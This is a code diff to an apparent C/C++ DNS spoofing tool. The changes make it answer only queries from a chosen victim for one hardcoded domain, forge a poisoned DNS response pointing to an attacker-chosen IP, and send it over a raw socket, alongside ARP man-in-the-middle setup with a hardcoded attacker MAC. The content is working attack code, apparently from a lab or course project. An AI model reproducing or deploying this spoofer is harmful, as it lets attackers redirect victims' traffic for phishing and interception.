@@ -16,6 +16,10 @@ void dnsSpoof(NetworkEngine *net);
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet);
 
+struct in_addr victimIp;                                  // get this from config file
+struct in_addr gatewayIp;                                 // get this from config file
+
+
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
 // dns poison we need: domain to poison, what to poison too
@@ -25,8 +29,6 @@ int main(int argc, const char *argv[]) {
 
     unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a,
                                            0xee, 0x8d, 0xa5}; // get this from config file
-    struct in_addr victimIp;                                  // get this from config file
-    struct in_addr gatewayIp;                                 // get this from config file
     unsigned char victimMac[ETH_ALEN];                        // get this from arp request
     unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request
 
@@ -171,6 +173,8 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
 
+    unsigned char addressFilter[] = {0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x02, 0x63, 0x61, 0x00};
+
     unsigned char buffer[1500];
     struct iphdr *ip;
     struct udphdr *udp;
@@ -188,16 +192,28 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     // get dns header
     dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
 
-    std::cout << "dns packet received" << std::endl;
+    if (dns->qr == 1) return;
+
+    unsigned char *printIp = (unsigned char *)&victimIp.s_addr;
+    if (ip->saddr != victimIp.s_addr) {
+        std::cout << "from not out victim" << std::endl;
+        printf("packet was from %d.%d.%d.%d\n", printIp[0], printIp[1], printIp[2], printIp[3]);
+        return;
+    }
+
+    printf("query from %d.%d.%d.%d\n", printIp[0], printIp[1], printIp[2], printIp[3]);
+
+    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
+    for (int i = 0; addressFilter[i]; i++) {
+        if (addressFilter[i] != query[i]) {
+            std::cout << "query mismatch" << std::endl;
+            return;
+        }
+    }
 
     // craft the poisoned response
+    memset(buffer, 0, 1500);
     int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
-
-    struct in_addr originalSrc;
-    struct in_addr originalDst;
-    originalSrc.s_addr = ip->saddr;
-    originalDst.s_addr = ip->daddr;
-
     std::cout << "craft a response with size: " << responseSize << std::endl;
 
     // reply
@@ -226,7 +242,7 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     pseudo_header.placeholder = 0;
     pseudo_header.protocol = IPPROTO_UDP;
     pseudo_header.udpLen = htons(udpBuffer->len);
-    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8 + responseSize);
+    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
     short totalLen = 20 + 8 + responseSize;
     ipBuffer->tot_len = htons(totalLen);
 
@@ -235,8 +251,8 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     sin.sin_port = udpBuffer->source;;
     sin.sin_addr.s_addr = ipBuffer->daddr;
 
-    sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
-    std::cout << "sending reply" << std::endl;
+    int bytesSent = sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
+    std::cout << "sending reply, size: " << bytesSent << std::endl;
 
     close(rawSocket);
 }
